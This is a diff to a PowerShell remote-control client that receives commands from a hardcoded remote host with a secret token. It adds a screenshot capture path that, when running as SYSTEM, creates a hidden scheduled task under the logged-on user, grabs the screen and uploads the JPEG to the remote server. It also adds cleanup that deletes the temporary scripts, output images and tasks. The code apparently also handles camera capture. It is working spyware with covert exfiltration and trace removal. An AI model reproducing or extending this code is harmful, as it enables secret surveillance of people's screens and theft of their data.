@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.2.4"
+$Version = "3.2.5"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -126,8 +126,17 @@ try {
     }
 } catch {}
 try {
-    Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'       -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+} catch {}
+try {
+    Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
+        try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
+        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    }
 } catch {}
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -1152,8 +1161,17 @@ function Connect-Cloudflare {
                         }
                     } catch {}
                     try {
-                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'     -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'       -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'   -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                    } catch {}
+                    try {
+                        Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
+                            try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
+                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+                        }
                     } catch {}
                     # Release mutex and stop
                     try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
@@ -1178,14 +1196,23 @@ function Connect-Cloudflare {
                         }
                     } catch {}
                     try {
+                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cap_*.ps1'      -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cap_out_*.jpg'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ChildItem $env:TEMP -Filter 'cap_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                    } catch {}
+                    try {
                         Get-ScheduledTask -TaskName "CameraCapture_*" -ErrorAction SilentlyContinue | ForEach-Object {
                             try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
                             Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                         }
                     } catch {}
                     try {
-                        Get-ChildItem $env:TEMP -Filter 'cam_*.ps1'     -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                        Get-ChildItem $env:TEMP -Filter 'cam_err_*.txt'  -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                        Get-ScheduledTask -TaskName "Capture_*" -ErrorAction SilentlyContinue | ForEach-Object {
+                            try { Stop-ScheduledTask  -TaskName $_.TaskName -ErrorAction SilentlyContinue } catch {}
+                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+                        }
                     } catch {}
                     # 3) Restore power policy
                     try {
@@ -1254,56 +1281,79 @@ function Connect-Cloudflare {
 
                 if ($command -eq "capture") {
                     try {
-                        Add-Type -AssemblyName System.Drawing
-                        if (-not ([System.Management.Automation.PSTypeName]'ScreenCapGdi').Type) {
-                            $drawingAsm = [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing').Location
-                            Add-Type -ReferencedAssemblies $drawingAsm -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-using System.Drawing;
-using System.Drawing.Imaging;
-public class ScreenCapGdi {
-    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
-    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
-    [DllImport("user32.dll")] public static extern int    ReleaseDC(IntPtr hWnd, IntPtr hDC);
-    [DllImport("gdi32.dll")]  public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
-    [DllImport("gdi32.dll")]  public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int w, int h);
-    [DllImport("gdi32.dll")]  public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObj);
-    [DllImport("gdi32.dll")]  public static extern bool   BitBlt(IntPtr dst, int dx, int dy, int w, int h, IntPtr src, int sx, int sy, int rop);
-    [DllImport("gdi32.dll")]  public static extern bool   DeleteObject(IntPtr hObj);
-    [DllImport("gdi32.dll")]  public static extern bool   DeleteDC(IntPtr hDC);
-    [DllImport("gdi32.dll")]  public static extern int    GetDeviceCaps(IntPtr hDC, int idx);
-    public static byte[] Capture() {
-        IntPtr desktop = GetDesktopWindow();
-        IntPtr dcSrc   = GetWindowDC(desktop);
-        int w = GetDeviceCaps(dcSrc, 8);
-        int h = GetDeviceCaps(dcSrc, 10);
-        IntPtr dcDst = CreateCompatibleDC(dcSrc);
-        IntPtr hBmp  = CreateCompatibleBitmap(dcSrc, w, h);
-        IntPtr hOld  = SelectObject(dcDst, hBmp);
-        BitBlt(dcDst, 0, 0, w, h, dcSrc, 0, 0, 0x00CC0020);
-        SelectObject(dcDst, hOld);
-        Bitmap bmp = Bitmap.FromHbitmap(hBmp);
-        DeleteDC(dcDst);
-        ReleaseDC(desktop, dcSrc);
-        DeleteObject(hBmp);
-        var ms    = new System.IO.MemoryStream();
-        var codec = GetJpegCodec();
-        var ep    = new EncoderParameters(1);
-        ep.Param[0] = new EncoderParameter(Encoder.Quality, (long)85);
-        bmp.Save(ms, codec, ep);
-        bmp.Dispose();
-        return ms.ToArray();
-    }
-    static ImageCodecInfo GetJpegCodec() {
-        foreach (var c in ImageCodecInfo.GetImageEncoders())
-            if (c.MimeType == "image/jpeg") return c;
-        return null;
-    }
-}
-'@
+                        $isSystem     = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
+                        $loggedOnUser = $null
+                        try { $loggedOnUser = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).UserName } catch {
+                            try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
                         }
-                        $jpegBytes  = [ScreenCapGdi]::Capture()
+
+                        if ($isSystem -and $loggedOnUser) {
+                            # --- SYSTEM path: one-shot scheduled task runs as logged-on user ---
+                            $capTaskId  = "Capture_$(Get-Random)"
+                            $capScript  = Join-Path $env:TEMP "cap_$capTaskId.ps1"
+                            $capOut     = Join-Path $env:TEMP "cap_out_$capTaskId.jpg"
+                            $capErr     = Join-Path $env:TEMP "cap_err_$capTaskId.txt"
+                            $capCode = @"
+try {
+    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+    `$s   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    `$bmp = New-Object System.Drawing.Bitmap(`$s.Width, `$s.Height)
+    `$g   = [System.Drawing.Graphics]::FromImage(`$bmp)
+    `$g.CopyFromScreen(`$s.Location, [System.Drawing.Point]::Empty, `$s.Size)
+    `$g.Dispose()
+    `$ms  = New-Object System.IO.MemoryStream
+    `$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { `$_.MimeType -eq 'image/jpeg' }
+    `$ep = New-Object System.Drawing.Imaging.EncoderParameters(1)
+    `$ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 85L)
+    `$bmp.Save(`$ms, `$codec, `$ep)
+    `$bmp.Dispose()
+    [System.IO.File]::WriteAllBytes('$capOut', `$ms.ToArray())
+} catch {
+    [System.IO.File]::WriteAllText('$capErr', `$_.Exception.Message)
+}
+"@
+                            [System.IO.File]::WriteAllText($capScript, $capCode, [System.Text.Encoding]::UTF8)
+                            $capAction    = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
+                                                -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
+                            $capPrincipal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
+                            $capSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+                            Register-ScheduledTask -TaskName $capTaskId -Action $capAction -Principal $capPrincipal -Settings $capSettings -Force | Out-Null
+                            Start-ScheduledTask -TaskName $capTaskId
+                            # Wait up to 12s for the output file
+                            $deadline = (Get-Date).AddSeconds(12)
+                            while ((Get-Date) -lt $deadline -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
+                                Start-Sleep -Milliseconds 300
+                            }
+                            # Cleanup task
+                            try { Stop-ScheduledTask      -TaskName $capTaskId -ErrorAction SilentlyContinue } catch {}
+                            try { Unregister-ScheduledTask -TaskName $capTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+                            try { Remove-Item $capScript -Force -ErrorAction SilentlyContinue } catch {}
+                            if (Test-Path $capErr) {
+                                $errTxt = [System.IO.File]::ReadAllText($capErr).Trim()
+                                try { Remove-Item $capErr -Force -ErrorAction SilentlyContinue } catch {}
+                                throw $errTxt
+                            }
+                            if (-not (Test-Path $capOut)) { throw 'Screenshot task timed out — no output produced' }
+                            $jpegBytes = [System.IO.File]::ReadAllBytes($capOut)
+                            try { Remove-Item $capOut -Force -ErrorAction SilentlyContinue } catch {}
+                        } else {
+                            # --- Non-SYSTEM path: capture directly ---
+                            Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                            $s   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                            $bmp = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
+                            $g   = [System.Drawing.Graphics]::FromImage($bmp)
+                            $g.CopyFromScreen($s.Location, [System.Drawing.Point]::Empty, $s.Size)
+                            $g.Dispose()
+                            $ms  = New-Object System.IO.MemoryStream
+                            $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
+                            $ep = New-Object System.Drawing.Imaging.EncoderParameters(1)
+                            $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 85L)
+                            $bmp.Save($ms, $codec, $ep)
+                            $bmp.Dispose()
+                            $jpegBytes = $ms.ToArray()
+                            $ms.Dispose()
+                        }
+
                         $captureUrl = "$cfHost/capture_frame?id=$clientId"
                         $req = [System.Net.HttpWebRequest]::Create($captureUrl)
                         $req.Method           = 'POST'
